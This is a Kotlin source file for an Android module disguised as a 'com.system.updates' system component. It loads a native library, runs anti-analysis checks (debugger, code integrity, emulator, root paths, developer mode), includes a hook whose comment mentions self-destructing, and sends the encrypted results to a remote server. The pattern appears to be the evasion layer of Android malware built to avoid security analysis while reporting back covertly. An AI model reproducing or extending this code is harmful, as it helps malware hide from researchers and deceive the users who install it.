package com.system.updates.modules.bridges

import android.content.Context
import android.os.Build
import android.util.Log
import com.system.updates.CryptoManager
import com.system.updates.Communicator
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File

class redamon {
    private val TAG = "RedamonBridge"

    companion object {
        init {
            try {
                System.loadLibrary("redamon_native")
                Log.d("RedamonBridge", "Native library loaded")
            } catch (e: UnsatisfiedLinkError) {
                Log.e("RedamonBridge", "Failed to load native library: ${e.message}")
            }
        }
    }

    // Native method declarations
    external fun detectDebuggerNative(): Boolean
    external fun checkCodeIntegrityNative(): Boolean
    external fun initiateAntiAnalysisActionNative(): Int

    // Java fallback implementations
    fun detectDebugger(): Boolean {
        return try {
            detectDebuggerNative()
        } catch (e: UnsatisfiedLinkError) {
            detectDebuggerJava()
        }
    }

    private fun detectDebuggerJava(): Boolean {
        return android.os.Debug.isDebuggerConnected() || android.os.Debug.waitingForDebugger()
    }

    fun checkCodeIntegrity(): Boolean {
        return try {
            checkCodeIntegrityNative()
        } catch (e: UnsatisfiedLinkError) {
            checkCodeIntegrityJava()
        }
    }

    private fun checkCodeIntegrityJava(): Boolean {
        // Simple signature check (example: verify that the package name hasn't changed)
        val expectedPackage = "com.system.updates"
        val actualPackage = this.javaClass.`package`?.name ?: ""
        return expectedPackage == actualPackage
    }

    fun initiateAntiAnalysisAction(): Int {
        return try {
            initiateAntiAnalysisActionNative()
        } catch (e: UnsatisfiedLinkError) {
            initiateAntiAnalysisActionJava()
        }
    }

    private fun initiateAntiAnalysisActionJava(): Int {
        // If analysis detected, maybe self-destruct or just return error code
        return -1
    }

    // Collect all security-related statuses
    suspend fun getSecurityStatus(context: Context): JSONObject = withContext(Dispatchers.IO) {
        val status = JSONObject()
        try {
            status.put("debugger", detectDebugger())
            status.put("integrity", checkCodeIntegrity())
            status.put("emulator", isEmulator())
            status.put("root", isRooted())
            status.put("developer_mode", isDeveloperModeEnabled(context))
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting security status: ${e.message}")
        }
        return@withContext status
    }

    // Helper methods (copied from AntiAnalysis for completeness)
    private fun isEmulator(): Boolean {
        val fingerprints = listOf("generic", "unknown", "emulator", "sdk")
        val hardware = Build.HARDWARE.lowercase()
        if (fingerprints.any { hardware.contains(it) }) return true
        val brand = Build.BRAND.lowercase()
        if (brand.contains("generic") || brand.contains("emulator")) return true
        val device = Build.DEVICE.lowercase()
        if (device.contains("generic") || device.contains("emulator")) return true
        val model = Build.MODEL.lowercase()
        if (model.contains("sdk") || model.contains("emulator") || model.contains("android sdk built for x86")) return true
        val product = Build.PRODUCT.lowercase()
        if (product.contains("sdk") || product.contains("google_sdk") || product.contains("emulator")) return true
        return false
    }

    private fun isRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/sbin/.magisk"
        )
        return paths.any { File(it).exists() }
    }

    private fun isDeveloperModeEnabled(context: Context): Boolean {
        return try {
            android.provider.Settings.Global.getInt(
                context.contentResolver,
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            ) != 0
        } catch (e: Exception) {
            false
        }
    }

    // Send encrypted status to server
    suspend fun sendSecurityStatus(context: Context) {
        val status = getSecurityStatus(context)
        val crypto = CryptoManager(context)
        val encrypted = crypto.encryptData(status.toString().toByteArray())
        val communicator = Communicator(context, crypto)
        communicator.sendEncryptedPayload(encrypted) // This method should exist in Communicator; if not, we adapt.
        // For now, we assume Communicator has a method to send generic encrypted data.
        // If not, we can call a custom endpoint.
    }

    // Initialize the module
    fun initialize() {
        Log.d(TAG, "Redamon bridge initialized")
    }
}